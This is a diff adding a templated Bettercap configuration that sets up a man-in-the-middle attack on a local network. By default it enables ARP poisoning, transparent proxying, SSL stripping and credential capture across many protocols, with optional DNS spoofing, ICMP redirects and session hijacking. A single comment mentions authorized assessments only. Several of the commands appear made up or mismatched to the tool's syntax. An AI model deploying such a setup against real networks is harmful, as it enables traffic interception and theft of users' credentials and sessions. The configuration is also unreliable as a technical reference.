@@ -1,0 +1,125 @@
+# Bettercap configuration file
+# This file configures the Bettercap penetration testing framework.
+# It sets up network interfaces, proxy behaviors, attack modules (MITM, SSL strip, DNS spoof),
+# credential harvesting targets, and logging.
+#
+# NOTE: Bettercap uses a `set <variable> <value>` syntax for its CLI/session configuration.
+# This template generates those commands.
+
+# ============================================================
+# MODULE LOADING (Startup Configuration)
+# ============================================================
+
+{% for module in (startup_modules | default([{'name': 'httpProxy', 'enabled': True}, {'name': 'dnsProxy', 'enabled': True}, {'name': 'tcpProxy', 'enabled': False}, {'name': 'httpServer', 'enabled': False}])) %}
+# Module: {{ module.name }}
+# Description: Load and enable/disable the specified module at startup.
+{% if module.enabled %}set {{ module.name }}.enabled true
+{% else %}# Module {{ module.name }} is disabled
+{% endif %}
+{% endfor %}
+
+# ============================================================
+# NETWORK INTERFACE & GATEWAY
+# ============================================================
+
+# Network interface to use for sniffing and MITM attacks (e.g., 'eth0', 'wlan0').
+# If not set, bettercap may attempt to auto-detect, but explicit is better.
+set net.interface {{ net_interface | default('eth0') }}
+
+# Gateway IP address.
+# Leave empty to auto-detect (recommended for dynamic environments like DHCP).
+{% if gateway_ip | default('') | string | trim != '' %}
+set net.gateway {{ gateway_ip | default('') | trim }}
+{% endif %}
+
+# ============================================================
+# HTTP/HTTPS PROXY & SSL STRIP
+# ============================================================
+
+# Port for the HTTP proxy server.
+set http.proxy.port {{ http_proxy_port | default(8080) }}
+
+# Port for the HTTPS proxy server.
+set https.proxy.port {{ https_proxy_port | default(8081) }}
+
+# Enable transparent proxying (intercept all HTTP/HTTPS traffic without client configuration).
+# When enabled, the proxy acts as a bridge for intercepted traffic.
+{% if transparent_proxy | default(True) %}
+set http.proxy.transparent true
+set https.proxy.transparent true
+{% else %}
+set http.proxy.transparent false
+set https.proxy.transparent false
+{% endif %}
+
+# Enable SSL stripping to downgrade HTTPS connections to HTTP (for credential harvesting).
+# WARNING: This is a Man-in-the-Middle technique. Use only in authorized security assessments.
+{% if ssl_strip | default(True) %}
+set http.proxy.sslstrip true
+{% else %}
+set http.proxy.sslstrip false
+{% endif %}
+
+# ============================================================
+# DNS SPOOFING
+# ============================================================
+
+# DNS spoofing configuration: map specific domains to custom IP addresses.
+# Expects a mapping/list of domains and a parallel list of addresses.
+# Format: set dns.spoof.domains domain1,domain2
+# Format: set dns.spoof.addresses ip1,ip2
+{% set _dns_spoof = dns_spoof | default({'domains': [], 'addresses': []}) %}
+{% if _dns_spoof.domains is defined and _dns_spoof.domains | length > 0 %}
+set dns.spoof.domains {{ _dns_spoof.domains | join(',') }}
+{% endif %}
+
+{% if _dns_spoof.addresses is defined and _dns_spoof.addresses | length > 0 %}
+set dns.spoof.addresses {{ _dns_spoof.addresses | join(',') }}
+{% endif %}
+
+# ============================================================
+# MITM & REDIRECTS
+# ============================================================
+
+# Enable ARP cache poisoning to position the host as the man-in-the-middle on the LAN.
+# This is the core mechanism for local network interception.
+{% if arp_spoof | default(True) %}
+set arp.spoof true
+{% else %}
+set arp.spoof false
+{% endif %}
+
+# Enable ICMP redirect spoofing for additional stealth on Linux (requires root).
+# Used to manipulate routing tables of victims.
+{% if icmp_redirects | default(False) %}
+set net.sniff.icmp_redirects true
+{% else %}
+set net.sniff.icmp_redirects false
+{% endif %}
+
+# ============================================================
+# CREDENTIAL HARVESTING & SESSION HIJACKING
+# ============================================================
+
+# List of protocols/services from which to capture credentials.
+# Examples: http, ftp, telnet, smtp, pop3, imap, ntlm, httpauth.
+set credentials.capture.targets {{ credentials_capture_targets | default(['http', 'ftp', 'telnet', 'smtp', 'pop3', 'imap', 'ntlm', 'httpauth']) | join(',') }}
+
+# Enable HTTP session hijacking to steal active web sessions.
+# Allows taking over active browser sessions captured via MITM.
+{% if session_hijacking | default(False) %}
+set http.hijack true
+{% else %}
+set http.hijack false
+{% endif %}
+
+# ============================================================
+# LOGGING
+# ============================================================
+
+# Path to the log file for captured data and events.
+set log.file {{ log_file | default('/var/log/bettercap/bettercap.log') }}
+
+# Log verbosity level.
+# 0=silent, 1=error, 2=warn, 3=info, 4=debug, 5=trace.
+set log.level {{ log_level | default(2) }}
